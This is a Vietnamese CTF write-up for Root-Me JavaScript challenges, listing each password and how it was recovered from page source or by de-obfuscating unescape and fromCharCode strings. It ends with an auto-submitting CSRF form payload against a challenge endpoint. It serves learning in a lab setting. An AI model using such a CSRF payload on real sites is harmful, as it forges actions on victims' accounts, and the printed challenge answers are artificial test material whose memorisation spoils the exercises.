### Javascript - Authentication:https:http://challenge01.root-me.org/web-client/ch9/
password:`sh.org`

đầu tiên chúng ta coi source của nó: gợi ý của nó là `Javascript - Authentication` 

<img src="http://image.prntscr.com/image/4ee663b4801d4572a4419bd89e1deb92.png">

sau khi vào đoan js : ta thấy luôn password

<img src="http://image.prntscr.com/image/1689c5870fec47948f3e067b7a302f20.png">

### Javascript - Source: http://challenge01.root-me.org/web-client/ch1/ch1.html

password: `123456azerty`
câu này thuộc dạng khoai : chỉ cần coi source là có tất cả: 

<img src="http://image.prntscr.com/image/b7ad883e944644a2a961ec2de73d8083.png">

### Javascript - Authentication 2 :http://challenge01.root-me.org/web-client/ch11/
password:`HIDDEN`

câu này vào thẳng vấn đề, vào đoạn js như câu 2:
<img src="http://image.prntscr.com/image/395c50ed82aa4afd88cf7c525daada4e.png">
nhìn vào đoạn js , ta thấy password là phần tử thứ 2 của biến thelists!

###  Javascript - Obfuscation 1: http://challenge01.root-me.org/web-client/ch4/ch4.html:

password:`cpasbiendurpassword`

câu này có tăng level lên chút :v như mấy cái trước đầu tiên phải coi source của nó , 
<img src="http://image.prntscr.com/image/da801b784ee445b6a5e32f11334bf0c0.png">

- Thoạt nhìn tưởng chuối vì chữ pass to đung đập vào mắt :))! **nhưng sai** pass là 1 biến để truyền vào lệnh `unescape`.Được cái không học js nên chả biết cái lệnh quái quỉ này, sợt gu gồ liền , vào web `w3school` .Lệnh này có chức năng Mã hóa và giải mã một chuỗi !Vào phần ví dụ của lệnh này , thay phần biến str_esc bằng phần pass trong source và nhấn run : có ngay pass :D

<img src="http://image.prntscr.com/image/551b1f0aab004a2f8c562cc4a5623635.png"> 

###Javascript - Obfuscation 2:http://challenge01.root-me.org/web-client/ch12/ch12.html
password:`hDufjdki156` 
- chú ý phần gợi ý và phần source: gợi ý là : Going down 3 floors..... đi 3 tầng :)) , nhìn vào source thấy đoạn pass! có 3 hàm lồng nhau ! chính nó đấy, chỉ cần giải đoạn đó là có pass!

giải đoạn đầu tiên, hàm `unescape` y chang bài trên , coppy rồi pass vào coi nó ra cái gì

<img src="http://image.prntscr.com/image/bb9c274a2f064338a7118d7f104e8f72.png">

cái hàm `String.fromCharCode` cái này mới , hỏi bác gu gồ thôi :

`String.fromCharCode` : fromCharCode(): chuyễn mã Unicode thành ký tự

ví dụ:

document.write(String.fromCharCode(72,69,76,76,79) );//HELLO

ở bài này , chỉ cần thay vào là ra pass thôi :D! 

<img src="http://image.prntscr.com/image/fd226593f9c345f183bf3ec77361f3ab.png">
$ csrf
```

<form name="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">

<label>Username:</label>
		
		<input type="hidden" name="username" value="b">
	
		<br>		
		<div class="form-group">
		<label>Status:</label>
		<input type="hidden" name="status" value="on" >




</from>

<script>document.forms["csrf"].submit()</script>// auto submit


```

